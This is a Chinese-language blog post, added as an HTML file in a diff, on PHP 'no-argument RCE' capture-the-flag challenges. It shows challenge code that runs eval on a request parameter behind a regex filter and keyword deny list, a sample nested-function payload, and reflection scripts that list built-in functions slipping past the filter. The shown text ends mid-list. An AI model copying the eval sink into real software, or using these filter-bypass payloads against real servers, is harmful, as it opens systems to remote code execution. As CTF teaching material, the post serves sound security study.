@@ -1,0 +1,1732 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>php 无参数 RCE - DumKiy's blog</title>
+
+<meta name="description" content="无参数 RCE 的场景此类 CTF 题目往往使用下面的正则表达式来限制输入。/[^\W]+\((?R)?\)//[^\s\(\)]+?\((?R)?\)/测试场景如下&lt;?phpif (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) ...">
+<link rel="canonical" href="http://localhost:4000/php/2023/06/08/php-%E6%97%A0%E5%8F%82%E6%95%B0RCE.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>php 无参数 RCE</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-06-07-php-无参数RCE.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="php 无参数 RCE"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=rce">rce</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Jun 08, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-06-08T05:49:21+08:00">
+    <meta itemprop="keywords" content="rce"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="无参数-rce-的场景">无参数 RCE 的场景</h1>
+
+<p>此类 CTF 题目往往使用下面的正则表达式来限制输入。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="p">[</span><span class="o">^</span>\<span class="n">W</span><span class="p">]</span><span class="o">+</span>\<span class="p">((</span><span class="err">?</span><span class="n">R</span><span class="p">)</span><span class="err">?</span>\<span class="p">)</span><span class="o">/</span>
+<span class="o">/</span><span class="p">[</span><span class="o">^</span>\<span class="n">s</span>\<span class="p">(</span>\<span class="p">)]</span><span class="o">+</span><span class="err">?</span>\<span class="p">((</span><span class="err">?</span><span class="n">R</span><span class="p">)</span><span class="err">?</span>\<span class="p">)</span><span class="o">/</span>
+</code></pre></div></div>
+<p>测试场景如下</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="s1">';'</span> <span class="o">===</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^\W]+\((?R)?\)/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>这就要求只能使用函数嵌套的方式 RCE 、读取文件或者获取敏感信息，例如：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">var_dump</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="nb">phpinfo</span><span class="p">()));</span>
+</code></pre></div></div>
+
+<p>更多时候题目会组合一些 waf，例如：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s2">"帮我找找flag吧 &lt;br&gt;"</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="s1">';'</span> <span class="o">===</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^\W]+\((?R)?\)/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]))</span> <span class="p">{</span> 
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/file|if|localeconv|phpversion|implode|apache|sqrt|et|na|nt|strlen|info|path|rand|die|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i'</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">])){</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]);</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker!"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"bad!"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span> 
+</code></pre></div></div>
+
+<h1 id="枚举满足条件的函数">枚举满足条件的函数</h1>
+<p>这种场景下，我们可以枚举所有可用的函数，满足条件的函数有两种</p>
+<ol>
+  <li>参数数量为 0 或者必选参数数量为 0 的函数。</li>
+  <li>参数数量为 1 或者必选参数数量为 1 的函数。</li>
+</ol>
+
+<h2 id="获取参数数量为-0-的内置函数">获取参数数量为 0 的内置函数</h2>
+<p>假设题目中的 waf 如下：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'/file|if|localeconv|phpversion|implode|apache|sqrt|et|na|nt|strlen|info|path|rand|die|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i'
+</code></pre></div></div>
+<p>那么可以编写下面的脚本来获取满足条件的函数</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$excludedRegex</span> <span class="o">=</span> <span class="s1">'/file|if|localeconv|phpversion|implode|apache|sqrt|et|na|nt|strlen|info|path|rand|die|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i'</span><span class="p">;</span>
+
+<span class="c1">// 获取所有内置函数</span>
+<span class="nv">$internalFunctions</span> <span class="o">=</span> <span class="nb">get_defined_functions</span><span class="p">()[</span><span class="s1">'internal'</span><span class="p">];</span>
+
+<span class="c1">// 遍历每个函数并检查参数数量</span>
+<span class="nv">$filteredFunctions</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$internalFunctions</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$functionName</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$excludedRegex</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// 排除匹配指定正则表达式的函数名</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$excludedRegex</span><span class="p">,</span> <span class="nv">$functionName</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// 获取函数的反射对象</span>
+    <span class="nv">$reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReflectionFunction</span><span class="p">(</span><span class="nv">$functionName</span><span class="p">);</span>
+
+    <span class="c1">// 获取函数的参数列表</span>
+    <span class="nv">$parameters</span> <span class="o">=</span> <span class="nv">$reflection</span><span class="o">-&gt;</span><span class="nf">getParameters</span><span class="p">();</span>
+
+    <span class="c1">// 检查参数数量</span>
+    <span class="nv">$numParameters</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">);</span>
+
+    <span class="c1">// 检查参数数量为0 或者必选参数数量为 0</span>
+    <span class="k">return</span> <span class="nv">$numParameters</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="nv">$reflection</span><span class="o">-&gt;</span><span class="nf">getNumberOfRequiredParameters</span><span class="p">()</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">});</span>
+
+<span class="c1">// 输出结果</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$filteredFunctions</span> <span class="k">as</span> <span class="nv">$functionName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nv">$functionName</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>结果如下, 不同的环境会有所不同。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">zend_version</span>
+<span class="n">func_num_args</span>
+<span class="n">error_reporting</span>
+<span class="n">restore_error_handler</span>
+<span class="n">restore_exception_handler</span>
+<span class="n">debug_backtrace</span>
+<span class="n">gc_mem_caches</span>
+<span class="n">gc_collect_cycles</span>
+<span class="n">gc_disable</span>
+<span class="n">gc_status</span>
+<span class="n">date_create</span>
+<span class="n">date_create_immutable</span>
+<span class="n">libxml_clear_errors</span>
+<span class="n">openssl_pkey_new</span>
+<span class="n">openssl_error_string</span>
+<span class="n">preg_last_error</span>
+<span class="n">preg_last_error_msg</span>
+<span class="n">filter_list</span>
+<span class="n">hash_algos</span>
+<span class="n">hash_hmac_algos</span>
+<span class="n">json_last_error</span>
+<span class="n">json_last_error_msg</span>
+<span class="n">lcg_value</span>
+<span class="n">ob_start</span>
+<span class="n">ob_flush</span>
+<span class="n">ob_clean</span>
+<span class="n">ob_end_flush</span>
+<span class="n">ob_end_clean</span>
+<span class="n">ob_list_handlers</span>
+<span class="n">ob_implicit_flush</span>
+<span class="n">flush</span>
+<span class="n">error_clear_last</span>
+<span class="n">connection_aborted</span>
+<span class="n">connection_status</span>
+<span class="n">header_remove</span>
+<span class="n">headers_list</span>
+<span class="n">rewinddir</span>
+<span class="n">readdir</span>
+<span class="n">umask</span>
+<span class="n">clearstatcache</span>
+<span class="n">phpcredits</span>
+<span class="n">uniqid</span>
+<span class="n">spl_autoload_extensions</span>
+<span class="n">spl_autoload_functions</span>
+<span class="n">spl_autoload_register</span>
+<span class="n">sodium_crypto_aead_aes256gcm_is_available</span>
+<span class="n">sodium_crypto_aead_aes256gcm_keygen</span>
+<span class="n">sodium_crypto_aead_chacha20poly1305_keygen</span>
+<span class="n">sodium_crypto_auth_keygen</span>
+<span class="n">sodium_crypto_box_keypair</span>
+<span class="n">sodium_crypto_kx_keypair</span>
+<span class="n">sodium_crypto_generichash_keygen</span>
+<span class="n">sodium_crypto_generichash_init</span>
+<span class="n">sodium_crypto_kdf_keygen</span>
+<span class="n">sodium_crypto_shorthash_keygen</span>
+<span class="n">sodium_crypto_sign_keypair</span>
+<span class="n">sodium_crypto_stream_keygen</span>
+<span class="n">sodium_crypto_stream_xchacha20_keygen</span>
+<span class="n">pdo_drivers</span>
+<span class="n">easter_date</span>
+<span class="n">easter_days</span>
+<span class="n">unixtojd</span>
+<span class="n">transliterator_list_ids</span>
+<span class="n">mb_language</span>
+<span class="n">mb_http_input</span>
+<span class="n">mb_http_output</span>
+<span class="n">mb_substitute_character</span>
+<span class="n">mb_list_encodings</span>
+<span class="n">mb_check_encoding</span>
+<span class="n">mb_regex_encoding</span>
+<span class="n">mysqli_connect</span>
+<span class="n">mysqli_connect_errno</span>
+<span class="n">mysqli_connect_error</span>
+<span class="n">mysqli_init</span>
+<span class="n">mysqli_thread_safe</span>
+<span class="n">readline</span>
+<span class="n">readline_clear_history</span>
+<span class="n">readline_list_history</span>
+<span class="n">readline_read_history</span>
+<span class="n">readline_write_history</span>
+<span class="n">readline_callback_read_char</span>
+<span class="n">readline_callback_handler_remove</span>
+<span class="n">readline_redisplay</span>
+<span class="n">readline_on_new_line</span>
+<span class="n">xmlwriter_open_memory</span>
+<span class="n">xdebug_break</span>
+<span class="n">xdebug_call_class</span>
+<span class="n">xdebug_call_function</span>
+<span class="n">xdebug_call_line</span>
+<span class="n">xdebug_code_coverage_started</span>
+<span class="n">xdebug_debug_zval</span>
+<span class="n">xdebug_debug_zval_stdout</span>
+<span class="n">xdebug_dump_superglobals</span>
+<span class="n">xdebug_is_debugger_active</span>
+<span class="n">xdebug_memory_usage</span>
+<span class="n">xdebug_peak_memory_usage</span>
+<span class="n">xdebug_start_code_coverage</span>
+<span class="n">xdebug_start_error_collection</span>
+<span class="n">xdebug_start_gcstats</span>
+<span class="n">xdebug_start_trace</span>
+<span class="n">xdebug_stop_code_coverage</span>
+<span class="n">xdebug_stop_error_collection</span>
+<span class="n">xdebug_stop_function_monitor</span>
+<span class="n">xdebug_stop_gcstats</span>
+<span class="n">xdebug_stop_trace</span>
+</code></pre></div></div>
+<h2 id="获取参数数量为-1-的内置函数">获取参数数量为 1 的内置函数</h2>
+<p>类似的，也可以获取参数数量为 1,或者必选参数数量为 1 的函数。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$excludedRegex</span> <span class="o">=</span> <span class="s1">'/file|if|localeconv|phpversion|implode|apache|sqrt|et|na|nt|strlen|info|path|rand|die|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i'</span><span class="p">;</span>
+
+<span class="c1">// 获取所有内置函数</span>
+<span class="nv">$internalFunctions</span> <span class="o">=</span> <span class="nb">get_defined_functions</span><span class="p">()[</span><span class="s1">'internal'</span><span class="p">];</span>
+
+<span class="c1">// 遍历每个函数并检查参数数量</span>
+<span class="nv">$filteredFunctions</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$internalFunctions</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$functionName</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$excludedRegex</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// 排除匹配指定正则表达式的函数名</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$excludedRegex</span><span class="p">,</span> <span class="nv">$functionName</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// 获取函数的反射对象</span>
+    <span class="nv">$reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReflectionFunction</span><span class="p">(</span><span class="nv">$functionName</span><span class="p">);</span>
+
+    <span class="c1">// 获取函数的参数列表</span>
+    <span class="nv">$parameters</span> <span class="o">=</span> <span class="nv">$reflection</span><span class="o">-&gt;</span><span class="nf">getParameters</span><span class="p">();</span>
+
+    <span class="c1">// 检查参数数量</span>
+    <span class="nv">$numParameters</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">);</span>
+
+    <span class="c1">// 检查参数数量为1或者必选参数数量为1</span>
+    <span class="k">return</span> <span class="nv">$numParameters</span> <span class="o">===</span> <span class="mi">1</span> <span class="o">||</span> <span class="nv">$numParameters</span> <span class="o">-</span> <span class="nv">$reflection</span><span class="o">-&gt;</span><span class="nf">getNumberOfRequiredParameters</span><span class="p">()</span> <span class="o">===</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">});</span>
+
+<span class="c1">// 输出结果</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$filteredFunctions</span> <span class="k">as</span> <span class="nv">$functionName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nv">$functionName</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>结果如下：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">error_reporting</span>
+<span class="n">define</span>
+<span class="n">defined</span>
+<span class="n">is_subclass_of</span>
+<span class="n">is_a</span>
+<span class="n">class_exists</span>
+<span class="n">trait_exists</span>
+<span class="n">enum_exists</span>
+<span class="n">function_exists</span>
+<span class="n">class_alias</span>
+<span class="n">trigger_error</span>
+<span class="n">extension_loaded</span>
+<span class="n">date</span>
+<span class="n">idate</span>
+<span class="n">gmdate</span>
+<span class="n">date_create_from_format</span>
+<span class="n">date_create_immutable_from_format</span>
+<span class="n">openssl_x509_read</span>
+<span class="n">openssl_x509_free</span>
+<span class="n">openssl_pkey_new</span>
+<span class="n">openssl_pkey_free</span>
+<span class="n">openssl_free_key</span>
+<span class="n">openssl_pbkdf2</span>
+<span class="n">openssl_private_encrypt</span>
+<span class="n">openssl_public_encrypt</span>
+<span class="n">openssl_sign</span>
+<span class="n">openssl_open</span>
+<span class="n">openssl_digest</span>
+<span class="n">openssl_cipher_iv_length</span>
+<span class="n">openssl_cipher_key_length</span>
+<span class="n">openssl_pkey_derive</span>
+<span class="n">openssl_spki_new</span>
+<span class="n">preg_quote</span>
+<span class="n">preg_grep</span>
+<span class="n">gzopen</span>
+<span class="n">zlib_encode</span>
+<span class="n">gzinflate</span>
+<span class="n">gzuncompress</span>
+<span class="n">gzwrite</span>
+<span class="n">gzputs</span>
+<span class="n">gzrewind</span>
+<span class="n">gzeof</span>
+<span class="n">gzpassthru</span>
+<span class="n">gztell</span>
+<span class="n">deflate_init</span>
+<span class="n">deflate_add</span>
+<span class="n">inflate_init</span>
+<span class="n">inflate_add</span>
+<span class="n">filter_id</span>
+<span class="n">hash_hmac</span>
+<span class="n">hash_update_stream</span>
+<span class="n">hash_copy</span>
+<span class="n">mhash</span>
+<span class="n">header_register_callback</span>
+<span class="n">ob_implicit_flush</span>
+<span class="n">stream_wrapper_register</span>
+<span class="n">stream_register_wrapper</span>
+<span class="n">stream_wrapper_unregister</span>
+<span class="n">stream_wrapper_restore</span>
+<span class="n">krsort</span>
+<span class="n">ksort</span>
+<span class="n">sizeof</span>
+<span class="n">asort</span>
+<span class="n">arsort</span>
+<span class="n">sort</span>
+<span class="n">rsort</span>
+<span class="n">end</span>
+<span class="n">prev</span>
+<span class="n">next</span>
+<span class="n">key</span>
+<span class="n">min</span>
+<span class="n">max</span>
+<span class="n">compact</span>
+<span class="n">range</span>
+<span class="n">shuffle</span>
+<span class="n">ip2long</span>
+<span class="n">long2ip</span>
+<span class="n">putenv</span>
+<span class="n">sleep</span>
+<span class="n">usleep</span>
+<span class="n">forward_static_call</span>
+<span class="n">register_shutdown_function</span>
+<span class="n">show_source</span>
+<span class="n">php_strip_whitespace</span>
+<span class="n">highlight_string</span>
+<span class="n">ini_restore</span>
+<span class="n">register_tick_function</span>
+<span class="n">unregister_tick_function</span>
+<span class="n">crc32</span>
+<span class="n">checkdnsrr</span>
+<span class="n">md5</span>
+<span class="n">sha1</span>
+<span class="n">header_remove</span>
+<span class="n">trim</span>
+<span class="n">rtrim</span>
+<span class="n">chop</span>
+<span class="n">ltrim</span>
+<span class="n">join</span>
+<span class="n">strtok</span>
+<span class="n">strtoupper</span>
+<span class="n">strtolower</span>
+<span class="n">stristr</span>
+<span class="n">strstr</span>
+<span class="n">strchr</span>
+<span class="n">substr</span>
+<span class="n">substr_replace</span>
+<span class="n">chr</span>
+<span class="n">ucfirst</span>
+<span class="n">lcfirst</span>
+<span class="n">strtr</span>
+<span class="n">strrev</span>
+<span class="n">similar_text</span>
+<span class="n">addslashes</span>
+<span class="n">stripcslashes</span>
+<span class="n">stripslashes</span>
+<span class="n">str_replace</span>
+<span class="n">str_ireplace</span>
+<span class="n">hebrev</span>
+<span class="n">nl2br</span>
+<span class="n">strip_tags</span>
+<span class="n">sscanf</span>
+<span class="n">str_rot13</span>
+<span class="n">str_shuffle</span>
+<span class="n">str_split</span>
+<span class="n">utf8_encode</span>
+<span class="n">opendir</span>
+<span class="n">dir</span>
+<span class="n">chdir</span>
+<span class="n">chroot</span>
+<span class="n">rewinddir</span>
+<span class="n">readdir</span>
